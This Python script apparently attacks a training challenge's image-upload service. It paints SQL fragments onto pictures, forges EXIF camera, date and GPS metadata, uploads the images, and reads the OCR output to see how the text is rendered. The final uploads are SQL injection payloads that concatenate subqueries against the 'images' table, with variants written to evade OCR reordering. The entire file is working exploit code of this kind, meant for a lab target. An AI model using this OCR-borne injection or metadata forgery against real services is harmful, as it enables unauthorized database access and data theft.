# v2_diag_from.py — base format works (93.46.19). Reading table 'images' fails. SEE how OCR renders
# the table-read snippets as PLAIN TEXT (always 200) to know what breaks, then try wordings that
# survive. Also test if OCR reorders when words are joined by underscores/case.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")
CNT=[0]

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=30):
    W=min(2000,max(1000,40+int(len(text)*size*0.56))); H=260
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("df.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"df.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("df.jpg","rb").read()).decode()

def up(painted, desc):
    CNT[0]+=1
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    ocr=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
    print(f"{desc:18} {r.status_code} ocr={ocr!r}")
    return r.status_code, ocr

sq="'"
print("=== SEE how OCR renders table-read text (plain, always 200) ===")
up("SELECT count all FROM images", "p_from_images")      # how is 'FROM images' ordered?
up("SELECT user_id FROM images WHERE id equals 1", "p_full")
up("FROM[images]", "p_bracket")                           # how does OCR read [images]?
up("SELECT count star FROM (images)", "p_parens")
print()
print("=== executable variants that might dodge reorder ===")
# maybe reorder happens only with exactly two tokens; add a 3rd token after images to anchor order
up("9"+sq+"||(SELECT count(*) FROM images LIMIT 1)||"+sq+"9", "x_limit")
# uppercase table? or newline trick: put FROM and images with a comma-join subselect
up("9"+sq+"||(SELECT(SELECT count(*) FROM images))||"+sq+"9", "x_nested")
# pragma table_info as alternative to read data? first just count rows via max(rowid)
up("9"+sq+"||(SELECT max(id) FROM images)||"+sq+"9", "x_maxid")
